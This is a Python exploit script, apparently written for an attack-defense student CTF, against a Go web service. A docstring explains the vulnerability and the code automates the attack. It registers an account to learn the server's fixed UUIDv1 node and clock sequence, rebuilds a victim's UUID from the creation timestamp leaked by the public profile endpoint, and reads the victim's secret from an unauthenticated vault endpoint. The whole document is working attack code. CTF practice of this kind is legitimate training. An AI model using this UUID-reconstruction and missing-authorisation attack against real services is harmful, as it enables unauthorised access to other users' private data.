"""vnek exploit — A&D Student CTF 2026, service "ВКонтакта" (Go, :28080).

Vuln (original service, from source on our vulnbox):
  * GET /api/vault?uuid=<X> returns ANY user's secret with NO auth check.
  * User IDs are UUIDv1 from google/uuid with a per-process-fixed node + clock_seq;
    GET /api/profile?username=<X> leaks the victim's exact v1 timestamp verbatim in
    the public "created" field (RFC3339Nano).
  => register once to learn this box's node+clock_seq (from our own returned uuid),
     reconstruct the victim's exact UUID from their leaked timestamp, then read their
     vault secret = flag. No auth, no brute force.

Patched boxes switch to UUIDv4 (non-reconstructable) and/or require auth on vault;
the reconstruction then yields a wrong id / 403 and exploit() returns [].

flag_id = ForcAD attack-data hint, JSON string {"username": "..."}.
"""
import datetime
import http.cookiejar
import json
import re
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request
import uuid as U

TIMEOUT = 6
FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
G1582 = 122192928000000000  # 100ns units between 1582-10-15 and the unix epoch


def _op():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))


def _call(op, url, form=None):
    data = urllib.parse.urlencode(form).encode() if form is not None else None
    req = urllib.request.Request(url, data=data, method="POST" if form is not None else "GET")
    try:
        r = op.open(req, timeout=TIMEOUT)
        return r.status, json.loads(r.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode())
        except Exception:
            return e.code, {}
    except Exception:
        return 0, {}


def _created_to_100ns(created):
    m = re.match(r"(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2})(?:\.(\d+))?Z?", created)
    if not m:
        return None
    y, mo, d, h, mi, s = (int(m.group(i)) for i in range(1, 7))
    nanos = int((m.group(7) or "").ljust(9, "0")[:9])
    epoch = datetime.datetime(1970, 1, 1, tzinfo=datetime.timezone.utc)
    dt = datetime.datetime(y, mo, d, h, mi, s, tzinfo=datetime.timezone.utc)
    secs = int((dt - epoch).total_seconds())
    return secs * 10_000_000 + nanos // 100 + G1582


def _build_uuid(created, node, clock_seq):
    t = _created_to_100ns(created)
    if t is None:
        return None
    time_low = t & 0xFFFFFFFF
    time_mid = (t >> 32) & 0xFFFF
    time_hi = ((t >> 48) & 0x0FFF) | (1 << 12)
    csh = ((clock_seq >> 8) & 0x3F) | 0x80
    csl = clock_seq & 0xFF
    return str(U.UUID(fields=(time_low, time_mid, time_hi, csh, csl, node)))


def exploit(host, port, flag_id):
    hint = flag_id
    if isinstance(flag_id, str):
        try:
            hint = json.loads(flag_id)
        except Exception:
            hint = {"username": flag_id}
    username = (hint or {}).get("username")
    if not username:
        return []
    base = "http://%s:%d" % (host, int(port))
    op = _op()
    # learn this box's fixed node + clock_seq from our own freshly-registered v1 uuid
    sc, reg = _call(op, base + "/api/register", {"username": "t" + secrets.token_hex(7), "password": "password123"})
    myid = reg.get("uuid") if isinstance(reg, dict) else None
    if not myid:
        return []
    try:
        me = U.UUID(myid)
    except Exception:
        return []
    if me.version != 1:
        return []           # patched: random UUIDv4, not reconstructable
    # leak the victim's exact v1 timestamp from the public profile
    sc, prof = _call(op, base + "/api/profile?username=" + urllib.parse.quote(username))
    created = prof.get("created") if isinstance(prof, dict) else None
    if not created:
        return []
    victim = _build_uuid(created, me.node, me.clock_seq)
    if not victim:
        return []
    sc, vault = _call(op, base + "/api/vault?uuid=" + victim)
    out = []
    if isinstance(vault, dict):
        for v in vault.values():
            if isinstance(v, str):
                out += FLAG_RE.findall(v)
    return list(dict.fromkeys(out))


if __name__ == "__main__":
    print(exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3] if len(sys.argv) > 3 else None))
